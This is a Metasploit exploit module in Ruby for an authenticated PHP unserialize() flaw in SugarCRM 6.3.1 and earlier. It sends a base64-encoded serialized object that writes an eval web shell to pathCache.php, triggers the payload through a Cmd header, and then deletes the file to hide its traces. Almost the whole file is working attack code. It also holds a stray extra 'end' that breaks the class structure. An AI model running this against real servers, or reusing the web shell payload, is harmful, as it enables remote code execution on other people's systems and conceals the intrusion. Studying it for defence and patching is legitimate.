# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;SugarCRM <= 6.3.1 unserialize() PHP Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a php unserialize() vulnerability in SugarCRM <= 6.3.1
                which could be abused to allow authenticated SugarCRM users to execute arbitrary
                code with the permissions of the webserver.
 
                The dangerous unserialize() exists in the &#039;include/MVC/View/views/view.list.php&#039;
                script, which is called with user controlled data from the &#039;current_query_by_page&#039;
                parameter. The exploit abuses the __destruct() method from the SugarTheme class
                to write arbitrary PHP code to a &#039;pathCache.php&#039; on the web root.
            },
            &#039;Author&#039;    =>
                [
                    &#039;EgiX&#039;, # Vulnerability discovery and PoC
                    &#039;juan vazquez&#039;, # Metasploit module
                    &#039;sinn3r&#039; # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-0694&#039; ],
                    [ &#039;EDB&#039;, &#039;19381&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.sugarcrm.com/forums/f22/critical-security-vulnerability-76537/&#039; ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                },
            &#039;Targets&#039;        => [ [&#039;Automatic&#039;, { }], ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jun 23 2012&#039;
            ))
 
            register_options(
                [
                    OptString.new(&#039;TARGETURI&#039;,  [ true, "The base path to the web application", "/sugarcrm/"]),
                    OptString.new(&#039;USERNAME&#039;, [true, "The username to authenticate with" ]),
                    OptString.new(&#039;PASSWORD&#039;, [true, "The password to authenticate with" ])
                ], self.class)
    end
 
 
    def on_new_session(client)
            f = "pathCache.php"
            client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
            begin
                client.fs.file.rm(f)
                print_good("#{@peer} - #{f} removed to stay ninja")
            rescue
                print_error("#{@peer} - Unable to remove #{f}")
            end
        end
    end
 
    def exploit
        base = target_uri.path
        base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
 
        @peer = "#{rhost}:#{rport}"
        username = datastore[&#039;USERNAME&#039;]
        password = datastore[&#039;PASSWORD&#039;]
 
        # Can&#039;t use vars_post because it&#039;ll escape "_"
        data = "module=Users&"
        data << "action=Authenticate&"
        data << "user_name=#{username}&"
        data << "user_password=#{password}"
 
        res = send_request_cgi(
        {
            &#039;uri&#039;    => "#{base}index.php" ,
            &#039;method&#039; => "POST",
            &#039;headers&#039;   =>
                {
                    &#039;Cookie&#039;  => "PHPSESSID=1",
                },
            &#039;data&#039;   => data
        })
 
        if not res or res.headers[&#039;Location&#039;] =~ /action=Login/ or not res.headers[&#039;Set-Cookie&#039;]
            print_error("#{@peer} - Login failed with \"#{username}:#{password}\"")
            return
        end
 
        if res.headers[&#039;Set-Cookie&#039;] =~ /PHPSESSID=([A-Za-z0-9]*); path/
            session_id = $1
        else
            print_error("#{@peer} - Login failed with \"#{username}:#{password}\" (No session ID)")
            return
        end
 
        print_status("#{@peer} - Login successful with #{username}:#{password}")
 
        data = "module=Contacts&"
        data << "Contacts2_CONTACT_offset=1&"
        data << "current_query_by_page="
        #O:10:"SugarTheme":2:{s:10:"*dirName";s:5:"../..";s:20:"SugarTheme_jsCache";s:49:"<?php eval(base64_decode($_SERVER[HTTP_CMD])); ?>";}
        data << "TzoxMDoiU3VnYXJUaGVtZSI6Mjp7czoxMDoiACoAZGlyTmFtZSI7czo1OiIuLi8uLiI7czoyMDoiAFN1Z2FyVGhlbWUAX2pzQ2FjaGUiO3M6NDk6Ijw/cGhwIGV2YWwoYmFzZTY0X2RlY29kZSgkX1NFUlZFUltIVFRQX0NNRF0pKTsgPz4iO30="
 
        print_status("#{@peer} - Exploiting the unserialize()")
 
        res = send_request_cgi(
        {
            &#039;uri&#039; => "#{base}index.php",
            &#039;method&#039; => &#039;POST&#039;,
            &#039;headers&#039;   =>
            {
                &#039;Cookie&#039;  => "PHPSESSID=#{session_id};",
            },
            &#039;data&#039; => data
        })
 
        if not res or res.code != 200
            print_error("#{@peer} - Exploit failed: #{res.code}")
            return
        end
 
        print_status("#{@peer} - Executing the payload")
 
        res = send_request_cgi(
        {
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "#{base}pathCache.php",
            &#039;headers&#039; => {
                &#039;Cmd&#039; => Rex::Text.encode_base64(payload.encoded)
            }
        })
 
        if res
            print_error("#{@peer} - Payload execution failed: #{res.code}")
            return
        end
 
    end
end



